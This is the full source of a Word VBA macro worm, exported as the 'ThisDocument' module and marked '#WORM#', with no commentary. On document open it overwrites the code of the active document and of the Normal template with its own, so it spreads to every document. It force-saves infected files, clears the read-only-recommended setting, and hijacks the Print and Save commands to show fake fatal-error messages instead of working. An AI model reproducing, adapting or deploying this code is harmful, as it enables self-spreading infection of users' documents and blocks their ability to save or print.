   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   '#WORM#
   Private preventSave As Boolean
   Private Sub Document_New()
   preventSave = True
   On Error Resume Next
   Document_Open
   End Sub
   Private Sub WORMprint()
   On Error Resume Next
   MsgBox "Cannot print this document." + vbLf + "Server does not response.", vbCritical Or vbSystemModal, "Fatal error"
   End Sub
   Private Sub WORMsave()
   On Error Resume Next
   MsgBox "Cannot save this document." + vbLf + "Disk might be damaged or read protected.", vbCritical Or vbSystemModal, "Fatal error"
   End Sub
   Private Sub Document_Open()
   On Error Resume Next
   Set adoc = ActiveDocument.VBProject.VBComponents.Item(1)
   Set ntem = NormalTemplate.VBProject.VBComponents.Item(1)
   CommandBars("file").Controls("Ïå÷àòü...").OnAction = "WORMprint"
   CommandBars("standard").Controls("Ïå÷àòü").OnAction = "WORMprint"
   CommandBars("file").Controls("Ñîõðàíèòü").OnAction = "WORMsave"
   CommandBars("standard").Controls("Ñîõðàíèòü").OnAction = "WORMsave"
   If adoc.CodeModule.lines(1, 1) <> "'#WORM#" Then
       BGN = 1: adoc.CodeModule.DeleteLines 1, adoc.CodeModule.CountOfLines
       Do: adoc.CodeModule.insertlines BGN, ntem.CodeModule.lines(BGN, 1)
       BGN = BGN + 1
       Loop Until ntem.CodeModule.lines(BGN, 1) = ""
       If Not preventSave Then
           If Not ActiveDocument.ReadOnly Then
               If ActiveDocument.ReadOnlyRecommended Then ActiveDocument.ReadOnlyRecommended = False
               ActiveDocument.Save
           End If
       End If
   End If
   If ntem.CodeModule.lines(1, 1) <> "'#WORM#" Then
       BGN = 1: ntem.CodeModule.DeleteLines 1, ntem.CodeModule.CountOfLines
       Do: ntem.CodeModule.insertlines BGN, adoc.CodeModule.lines(BGN, 1)
       BGN = BGN + 1
       Loop Until adoc.CodeModule.lines(BGN, 1) = ""
   End If
   preventSave = False
   End Sub
